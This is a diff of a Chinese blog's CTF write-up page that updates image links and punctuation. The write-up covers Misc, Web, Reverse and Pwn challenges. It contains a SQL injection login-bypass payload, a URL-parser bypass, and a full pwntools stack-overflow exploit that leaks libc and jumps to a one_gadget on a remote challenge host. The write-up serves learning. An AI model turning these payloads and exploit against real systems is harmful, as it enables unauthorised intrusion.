@@ -25,17 +25,16 @@
 <meta property="og:site_name" content="HackerTerry&#39;s Blog">
 <meta property="og:description" content="前言未经本人授权，禁止转载和发布！ 正文CryptoEasy-RSAsympy解方程一把梭 1234567891011121314151617from sympy import Symbol, solvefrom gmpy2 import *from libnum import *n &#x3D; 2755230460622903490336605881584995403028764869506338536">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gvrkhxfm7wj60ab01u0sj02.jpg">
-<meta property="og:image" content="https://i.loli.net/2021/10/25/e6qIF8JRDj1BnzQ.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/25/3jEZJtPTySzwvQg.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/25/YBjlhc8D5oEW4CJ.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/25/MqEsDh9cGZRCNyQ.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/25/aMyCUbQKp72hBTr.png">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_babysql.png">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_easyweb.png">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_apk_1.png">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_apk_2.png">
+<meta property="og:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_dota.png">
 <meta property="article:published_time" content="2021-12-07T09:14:25.000Z">
-<meta property="article:modified_time" content="2026-07-13T14:54:13.608Z">
+<meta property="article:modified_time" content="2026-07-16T15:35:31.375Z">
 <meta property="article:author" content="HackerTerry">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gvrkhxfm7wj60ab01u0sj02.jpg">
+<meta name="twitter:image" content="https://rookieterry.github.io/img/notes/chuhui_ctf_babysql.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -337,7 +336,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：3 天前
+                    本文最后更新于：1 小时前
                   
                 
               </p>
@@ -357,51 +356,48 @@
 
 <h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="一袋米"><a href="#一袋米" class="headerlink" title="一袋米"></a>一袋米</h4><p>搜到原题</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46079186/article/details/120941245">https://blog.csdn.net/weixin_46079186/article/details/120941245</a></p>
-<p>将Yahiko.png用winrar压缩成zip，用ARCHPR工具进行明文攻击。解压进docx之后全选修改颜色为红色得到flag</p>
+<p>将Yahiko.png用winrar压缩成zip，用ARCHPR工具进行明文攻击。解压进docx之后全选修改颜色为红色得到flag：</p>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;c05909321b5e318bf6b0e<span class="hljs-number">41586f31882</span>&#125;<br></code></pre></td></tr></table></figure>
 
 <h4 id="国际歌"><a href="#国际歌" class="headerlink" title="国际歌"></a>国际歌</h4><p>用foremost提取出一张bmp图片，用stegsolve打开，Analyse选择Data Extract，勾选r,g,b的三个0通道，save bin得到flag的图片。</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gvrkhxfm7wj60ab01u0sj02.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="Host-log"><a href="#Host-log" class="headerlink" title="Host_log"></a>Host_log</h4><p>搜到原题</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46079186/article/details/120941245">https://blog.csdn.net/weixin_46079186/article/details/120941245</a></p>
 <p>写个脚本，先把4个文件放一块，得到所有的ip，一个一个ip过滤，把ip出现多次的都过滤掉了，最后发现了8.8.4.4，只出现过一次。查找到ip：192.168.100.115，账号名：lucy。</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.115</span>-lucy&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>web两个送分题。。</p>
-<h4 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h4><p>输入admin 123的时候显示 you are not admin</p>
-<p>然后尝试了一下万能密码 Hack detected 然后fuzz了一下发现好多都被ban了。</p>
-<p>然后之前遇到过BUUCTF的一道题目，是利用到 \ 来转义引号，然后实现注入的。</p>
+<h4 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h4><p>输入admin 123的时候显示<code>you are not admin</code></p>
+<p>然后尝试了一下万能密码<code>Hack detected</code>，然后fuzz了一下发现好多都被ban了。</p>
+<p>然后之前遇到过BUUCTF的一道题目，是利用到<code>\</code>来转义引号，然后实现注入的。</p>
 <p><strong>payload</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-operator">||</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span># <br></code></pre></td></tr></table></figure>
 
 <p>本来以为可能是考察盲注，结果登录进去就有flag 。。。</p>
-<p><img src="https://i.loli.net/2021/10/25/e6qIF8JRDj1BnzQ.png" srcset="/img/loading.gif" lazyload alt="1.png"></p>
-<h4 id="Easy-WEB"><a href="#Easy-WEB" class="headerlink" title="Easy-WEB"></a>Easy-WEB</h4><p>打开是个登录框，随便试了一下注入，未果。用dirsearch扫了一下，扫到一个 <code>/.DS_Store</code></p>
+<p><img src="/img/notes/chuhui_ctf_babysql.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Easy-WEB"><a href="#Easy-WEB" class="headerlink" title="Easy-WEB"></a>Easy-WEB</h4><p>打开是个登录框，随便试了一下注入，未果。用dirsearch扫了一下，扫到一个 <code>/.DS_Store</code>。</p>
 <p>然后看到看里面的内容可以发现 有几个php 文件 。先访问了那个<code>yzmcode.php</code> 没啥思路，后面又访问了一下<code>yfhgyrt.php</code> 拿到源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$url</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Can not parse url: &#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;http://&#x27;</span>), <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;google.cn&#x27;</span>)) === <span class="hljs-string">&#x27;google.cn&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hey, 老哥, 你会绕过吗!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<br>        <span class="hljs-variable">$url</span>[<span class="hljs-string">&#x27;host&#x27;</span>] === <span class="hljs-string">&#x27;google.cn&#x27;</span><br>    )&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;老哥！！！&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
 
-<p>没啥难度，直接用@格式绕过就行</p>
+<p>没啥难度，直接用@格式绕过就行。</p>
 <p><strong>payload</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">47.101</span>.<span class="hljs-number">38.214</span>:<span class="hljs-number">50002</span><span class="hljs-regexp">/yfhgyrt.php?url=http:/</span><span class="hljs-regexp">/My0n9s@google.cn/</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/25/3jEZJtPTySzwvQg.png" srcset="/img/loading.gif" lazyload alt="3.png"></p>
-<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="s-apk"><a href="#s-apk" class="headerlink" title="s.apk"></a>s.apk</h4><p>APK的题目，直接先拖进jeb里面静态分析一下，主逻辑在MainActivity里面，反编译看一下</p>
-<p><img src="https://i.loli.net/2021/10/25/YBjlhc8D5oEW4CJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p>直接一个checkSN函数，第一个参数是”Tenshine”，第二个参数是输入的内容</p>
-<p>再看看这个函数的内容</p>
-<p><img src="https://i.loli.net/2021/10/25/MqEsDh9cGZRCNyQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p>逻辑也很简单，就是<code>MD5(参数1)</code>结果的偶数位拼接，加上<code>flag&#123;&#125;</code>包裹后和<code>参数2</code>对比，相当即正确</p>
+<p><img src="/img/notes/chuhui_ctf_easyweb.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="s-apk"><a href="#s-apk" class="headerlink" title="s.apk"></a>s.apk</h4><p>APK的题目，直接先拖进jeb里面静态分析一下，主逻辑在MainActivity里面，反编译看一下：</p>
+<p><img src="/img/notes/chuhui_ctf_apk_1.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接一个checkSN函数，第一个参数是”Tenshine”，第二个参数是输入的内容。再看看这个函数的内容：</p>
+<p><img src="/img/notes/chuhui_ctf_apk_2.png" srcset="/img/loading.gif" lazyload></p>
+<p>逻辑也很简单，就是<code>MD5(参数1)</code>结果的偶数位拼接，加上<code>flag&#123;&#125;</code>包裹后和<code>参数2</code>对比，相当即正确。</p>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp2 = <span class="hljs-string">&#x27;b9c77224ff234f27ac6badf83b855c76&#x27;</span>         <span class="hljs-comment"># md5(&quot;Tenshine&quot;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp2)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> ==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(tmp2[i],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># flag&#123;bc72f242a6af3857&#125;</span><br></code></pre></td></tr></table></figure>
 
-<h4 id="爱生活dota"><a href="#爱生活dota" class="headerlink" title="爱生活dota"></a>爱生活dota</h4><p>32位，无壳，拖进IDA看</p>
-<p>逻辑就在主函数，很简单，贴一下简单的分析</p>
-<p><img src="https://i.loli.net/2021/10/25/aMyCUbQKp72hBTr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p>就是一个用户名和密码，用户名直接给了是<code>StarsWarss</code>，密码有个简单的异或，反推即可</p>
+<h4 id="爱生活dota"><a href="#爱生活dota" class="headerlink" title="爱生活dota"></a>爱生活dota</h4><p>32位，无壳，拖进IDA看。逻辑就在主函数，很简单，贴一下简单的分析：</p>
+<p><img src="/img/notes/chuhui_ctf_dota.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是一个用户名和密码，用户名直接给了是<code>StarsWarss</code>，密码有个简单的异或，反推即可。</p>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">text = [<span class="hljs-number">0x76</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x44</span>,<br>        <span class="hljs-number">0x79</span>]<br><br>tmp = <span class="hljs-string">&#x27;WuSheng2009&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(text[i] ^ <span class="hljs-built_in">ord</span>(tmp[i])), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># 拼接一下</span><br><span class="hljs-comment"># KEY&#123;StarsWarss!_L0VE_Dot@&#125;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="math"><a href="#math" class="headerlink" title="math"></a>math</h4><p>就是个栈溢出，但是输入size那里有个abs32取绝对值再取余，在储存有符号数的时候，补码的范围决定了最小的负数（-0x80000000）取绝对值后的结果无法表示，所以此时取绝对值后的结果还是（-0x80000000），然后就可以读入0xe0的内容，接着，puts泄露libc，打onegadget</p>
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="math"><a href="#math" class="headerlink" title="math"></a>math</h4><p>就是个栈溢出，但是输入size那里有个abs32取绝对值再取余，在储存有符号数的时候，补码的范围决定了最小的负数（-0x80000000）取绝对值后的结果无法表示，所以此时取绝对值后的结果还是（-0x80000000），然后就可以读入0xe0的内容，接着，puts泄露libc，打onegadget：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&quot;47.100.117.2&quot;</span>,<span class="hljs-number">10005</span>)<br><span class="hljs-comment">#p = process(&quot;./math&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./math&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi = <span class="hljs-number">0x400813</span> <span class="hljs-comment">#pop rdi;ret</span><br>main = <span class="hljs-number">0x40075b</span><br>ret = <span class="hljs-number">0x400566</span><br><br><br>p.sendlineafter(<span class="hljs-string">&quot;size\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(-<span class="hljs-number">0x80000000</span>)))<br><span class="hljs-comment">#gdb.attach(p)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>)+ <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;puts_addr=&quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr-libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>log.info(<span class="hljs-string">&quot;libc_base=&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>ogg = libc_base+<span class="hljs-number">0x4f432</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;size\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(-<span class="hljs-number">0x80000000</span>)))<br><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>)+ <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>+p64(ret)+p64(ogg)<br>p.send(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
                 
